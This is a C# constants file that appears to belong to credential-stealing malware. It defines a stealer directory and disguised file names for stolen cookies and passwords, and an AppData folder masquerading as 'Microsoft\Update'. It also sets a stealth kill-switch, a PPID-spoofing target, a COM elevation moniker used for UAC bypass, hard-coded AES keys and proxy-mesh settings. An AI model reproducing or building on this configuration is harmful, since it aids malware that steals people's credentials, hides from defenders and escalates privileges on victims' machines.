using System;

namespace VanguardCore
{
    public static class Constants
    {
        // [BLOCK_EDITION] Central Kill-Switch for Stealth
        // Set to false before final deployment to remove all strings, logs, and debug markers.
        public const bool DEBUG_MODE = false;

        // Build-time randomized markers (patched by full_rebuild.ps1)
        public const string IPC_EVENT_BASE = "EmoCore_Event_a5466d25";
        public const string APP_DATA_SUBDIR = "Microsoft\\Update\\1645e4";
        
        // [PRO] IO Randomization
        public const string STEALER_DIR_NAME = "6139Svc";
        public const string COOKIE_FILE_NAME = "cache_5570.db";
        public const string PASSWORD_FILE_NAME = "log_3905.tmp";
        public const string LOG_FILE_NAME = "err_1028.log";
        
        // Version info
        public const string VERSION = "2604.3.26-v1";

        // From defense/Constants:
        // These keys are updated at build time by full_rebuild.ps1
        // AES-GCM Keys (Base64)
        public const string MASTER_KEY_B64 = "mfS9jZLPLoW4wnOlqF/1V6ZxN5PwnREVPsktbXxSsgQ=";
        public const string ENCRYPTED_SESSION_KEY_B64 = "Ph8QzJQM23BACfDfMp/HkYOc/Y0rGmDAserCGshK+xs=";
        
        // Target process name for PPID spoofing
        public const string SPOOF_PARENT = "explorer";
        
        // Stealth Monikers
        public const string MONIKER_PREFIX = "Elevation:Administrator!new:";

        // --- ANTI-GFW PROXY MESH CONFIG ---
        public const string L1_PROXY_HOST = "";
        public const int L1_PROXY_PORT = 1080;
        public const string L1_PROXY_USER = "";
        public const string L1_PROXY_PASS = "";

        public const string L2_PROXY_HOST = "";
        public const int L2_PROXY_PORT = 1080;

        public const string GIST_MESH_FILENAME = "proxies.json";
        public static readonly string[] CLEAN_REGIONS = { "HK", "SG", "TW", "US", "DE", "FR", "JP", "GB" };
    }
}











































